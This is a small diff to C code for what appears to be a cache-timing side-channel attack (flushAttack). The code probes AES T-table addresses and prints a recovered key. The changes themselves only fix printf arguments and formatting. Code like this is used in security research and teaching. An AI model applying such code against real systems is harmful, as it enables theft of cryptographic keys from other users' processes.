@@ -128,7 +128,7 @@ void flushAttack(int sockfd)
     srand(min_time);
     sum = 0;
     char *probe[] = {base + 0x40c0, base + 0x44c0, base + 0x48c0, base + 0x4cc0};
-    printf("\nT-table addresses...\nTe0: %p\nTe1: %p\nTe2: %p\nTe3: %p\n", base, probe[0], probe[1], probe[2], probe[3]);
+    printf("\nT-table addresses...\nTe0: %p\nTe1: %p\nTe2: %p\nTe3: %p\n", probe[0], probe[1], probe[2], probe[3]);
     for (k = 0; k < 4; k++)
     {
         for (i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
@@ -261,10 +261,10 @@ void flushAttack(int sockfd)
         roundWords[1] = tempWord2;
         roundWords[0] = tempWord1;
     }
-    printf("Key found from attack: ");
+    printf("\nKey found from attack: ");
     for (i = 3; i >= 0; i--)
     {
-        printf("%X  ", roundWords[i]);
+        printf("%x  ", roundWords[i]);
     }
     printf("\n");
 
